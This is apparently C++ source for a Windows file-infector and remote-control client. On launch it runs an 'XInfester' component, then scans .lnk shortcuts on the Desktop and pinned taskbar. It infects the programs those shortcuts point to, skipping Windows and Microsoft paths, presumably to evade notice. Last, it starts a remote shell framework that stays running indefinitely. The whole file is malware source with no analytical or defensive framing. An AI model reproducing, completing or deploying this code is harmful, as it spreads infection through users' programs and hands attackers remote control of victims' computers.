#include "RemoteClientFrameWork.h"
#include "LnkFile.h"


#define  REMOTESHELL_PROCESS_GUID ("14B590DD-E9D3-4300-BF5D-4228B825B145")


HANDLE G_hMutex;

BOOL IsFilter(const char *Path)
{
	char Buffer[MAX_PATH];
	strcpy(Buffer,Path);
	strupr(Buffer);
	if (strstr(Buffer,"INDOWS"))
	{
		return TRUE;
	}
	if (strstr(Buffer,"ICROSOFT"))
	{
		return TRUE;
	}

	if (strstr(Buffer,"NTERNET EXPLORE"))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL IsAlreadyRunning()
{
	G_hMutex = ::CreateMutex(NULL,TRUE,REMOTESHELL_PROCESS_GUID);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(G_hMutex);
		return TRUE;
	}
	return FALSE;
}


int InfectDirectory(const char *Dir)
{
	int InfectCount=0;
	char FileName[MAX_PATH];
	WIN32_FIND_DATA findFileData;

	sprintf(FileName,"%s\\*.lnk",Dir);

	HANDLE hHandle=FindFirstFile(FileName,&findFileData);
	if (hHandle==INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	while (TRUE)
	{
		LnkFile lnkf;
		
		sprintf(FileName,"%s\\%s",Dir,findFileData.cFileName);
		const char *infFile=lnkf.GetLnkTargetFilePath(FileName);
		DWORD fileattr=GetFileAttributesA(infFile);

		if(!(fileattr&FILE_ATTRIBUTE_SYSTEM))
		{
				if(!IsFilter(infFile))
				if(XInfester_InfectFile(infFile))
				InfectCount++;
		}

		if (!FindNextFile(hHandle,&findFileData))
		{
			break;
		}
	}
	return InfectCount;

}

int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	//X Infester starter
	XInfester_Run();

	//Infect process
	//Desktop
	char path[MAX_PATH];
	SHGetSpecialFolderPath(0,path,CSIDL_DESKTOPDIRECTORY,0);
	InfectDirectory(path);
	SHGetSpecialFolderPath(0,path,CSIDL_APPDATA,0);
	strcat(path,"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
	InfectDirectory(path);

	if (IsAlreadyRunning())
	{
		exit(0);
	}
	

	if (!G_RemoteFrameWork.Initialize())
	{
		exit(0);
	}

	G_RemoteFrameWork.Run();

	while(1){Sleep(10000);};
}